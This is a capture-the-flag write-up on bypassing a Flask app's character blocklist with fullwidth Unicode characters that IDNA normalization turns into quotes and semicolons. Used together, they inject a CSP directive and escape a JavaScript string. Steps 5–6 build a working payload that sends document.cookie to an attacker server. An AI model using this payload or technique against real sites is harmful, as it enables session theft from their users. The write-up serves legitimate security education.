# Forbidden Script Ritual — CTF Write-Up

**Category:** Web  
**Subject:** CSP Injection + XSS via Unicode IDNA Normalization  
**Difficulty:** Medium/Hard

---

## Overview

We have a Flask app that takes a `?domain=` parameter, validates it as a URL, and injects it into two places:

1. The `Content-Security-Policy` HTTP header
2. A `<script>` tag inside the HTML body

The goal is to achieve XSS by bypassing both the character filter and the CSP.

---

## Step 1 — Understanding the Code

The app has a `validate_url()` function with a blocklist:

```python
FORBIDDEN_CHARS = ['"',"'",";",",","\n","\r","<",">"]
```

If any of these characters are found in the input, it returns `None` and the domain is not injected.

After validation, the hostname is extracted and **IDNA-encoded**:

```python
csp_domain_frame += "https://" + parsed_url.hostname.encode("idna").decode()
```

This value ends up in two places:

```python
# In the HTTP header:
response.headers["Content-Security-Policy"] = f"{csp_domain_frame} ; script-src 'self';"

# In the HTML body:
const allow_domain = "{csp_domain_frame}";
```

---

## Step 2 — Finding the Bug: IDNA Normalization

**IDNA** (Internationalized Domain Names in Applications) converts unicode domain names to ASCII using **Punycode**. Before encoding, it applies **NFKC normalization**, which maps certain unicode characters to their ASCII equivalents.

The key insight: some unicode characters that are **not in the blocklist** normalize to characters that **are** blocked.

A quick scan reveals the useful mappings:

| Unicode Char | Codepoint | Normalizes To |
|---|---|---|
| `；` | U+FF1B | `;` |
| `＇` | U+FF07 | `'` |
| `＂` | U+FF02 | `"` |
| `，` | U+FF0C | `,` |

These characters pass the `FORBIDDEN_CHARS` filter, but after `.encode("idna").decode()` they become their ASCII equivalents — which are valid CSP syntax characters.

---

## Step 3 — CSP Injection

The header is built like this:

```
frame-ancestors https://<HOSTNAME> ; script-src 'self';
```

If we inject a hostname like:

```
evil.com；script-src ＇unsafe-inline＇
```

After IDNA encoding this becomes:

```
evil.com;script-src 'unsafe-inline'
```

So the full CSP header becomes:

```
frame-ancestors https://evil.com;script-src 'unsafe-inline' ; script-src 'self';
```

The injected `script-src 'unsafe-inline'` directive overrides the restrictive `script-src 'self'`, allowing inline JavaScript execution.

---

## Step 4 — JS Injection

The hostname also lands inside a `<script>` tag:

```javascript
const allow_domain = "frame-ancestors https://<HOSTNAME>";
```

To break out of the string and inject JavaScript, we need `"` — which is blocked. But `＂` (U+FF02) normalizes to `"` after IDNA encoding.

So injecting:

```
＂；alert(1)；var x＝＂
```

Produces after IDNA:

```javascript
const allow_domain = "frame-ancestors https://evil.com;script-src 'unsafe-inline' ";alert(1);var x="";
```

---

## Step 5 — Exfiltrating Cookies

Now we need to exfiltrate `document.cookie` to our server. The naive payload would be:

```javascript
location='http://our-server.com/?c='+document.cookie
```

But `http://` contains `:` and `/` which cause problems:
- `/` in the hostname makes `urlparse` raise a `UnicodeError` under NFKC normalization (invalid netloc character)
- The full payload makes the IDNA label too long (max 63 chars per label)

The solution: use **JavaScript unicode escape sequences** for the problematic characters only.

```
: → \u003a
/ → \u002f
```

So `http://` becomes `http\u003a\u002f\u002f`, which the browser's JS engine interprets correctly but which does not interfere with URL parsing on the server side.

---

## Step 6 — Final Payload

```python
exfil = "our-server.com"
url = f"http\\u003a\\u002f\\u002f{exfil}\\u002f?c="

js_payload = f"＂；location=＇{url}＇+document.cookie；var x=＂"
csp_part   = "；script-src ＇unsafe-inline＇"

payload = f"https://evil.com{csp_part} {js_payload}"
```

After IDNA encoding, the injected hostname becomes:

```
evil.com;script-src 'unsafe-inline' ";location='http\u003a\u002f\u002four-server.com\u002f?c='+document.cookie;var x="
```

The resulting page contains:

```javascript
// CSP header: script-src 'unsafe-inline' is now allowed
const allow_domain = "frame-ancestors https://evil.com;script-src 'unsafe-inline' ";
location='http\u003a\u002f\u002four-server.com\u002f?c='+document.cookie;
var x="";
```



